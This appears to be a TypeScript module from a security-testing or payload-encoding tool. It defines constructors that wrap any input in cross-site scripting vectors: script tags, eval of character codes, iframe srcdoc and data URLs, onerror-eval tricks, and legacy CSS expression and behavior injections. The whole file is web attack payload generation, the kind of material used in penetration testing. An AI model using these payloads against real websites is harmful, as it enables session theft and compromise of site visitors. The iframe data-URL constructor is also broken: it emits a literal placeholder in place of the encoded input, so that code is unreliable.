import type { TagDef } from "../types";
import { tag } from "./define";

// XSS payload constructors — wrap the input in a delivery vector.
export const xssTags: TagDef[] = [
  tag("XSS", "eval_fromcharcode", "eval(String.fromCharCode(...))", (s) => {
    const codes = Array.from(s).map((c) => c.charCodeAt(0)).join(",");
    return `eval(String.fromCharCode(${codes}))`;
  }),
  tag("XSS", "script_data", "Wrap in <script> tags", (s) => `<script>${s}</script>`),
  tag("XSS", "uppercase_script", "Uppercase <SCRIPT> wrapper", (s) =>
    `<SCRIPT>${s}</SCRIPT>`,
  ),
  tag("XSS", "iframe_src_doc", "iframe srcdoc payload", (s) =>
    `<iframe srcdoc="${s.replace(/"/g, "&quot;")}"></iframe>`,
  ),
  tag("XSS", "iframe_data_url", "iframe with data: URL", (s) => {
    // base64 of the html
    return `<iframe src="data:text/html;base64,PAYLOAD">${s}</iframe>`;
  }),
  tag("XSS", "throw_eval", "window.onerror=eval;throw payload", (s) =>
    `window.onerror=eval;throw'=${s}'`,
  ),
  tag("XSS", "template_eval", "Template literal eval", (s) => `\${${s}}`),
  tag("XSS", "css_expression", "CSS expression() vector", (s) =>
    `expression(${s})`,
  ),
  tag("XSS", "behavior", "CSS behavior vector", (s) =>
    `behavior:url(${s})`,
  ),
  tag("XSS", "datasrc", "datasrc/datafld vector", (s) =>
    `datasrc="${s}" datafld="payload"`,
  ),
];
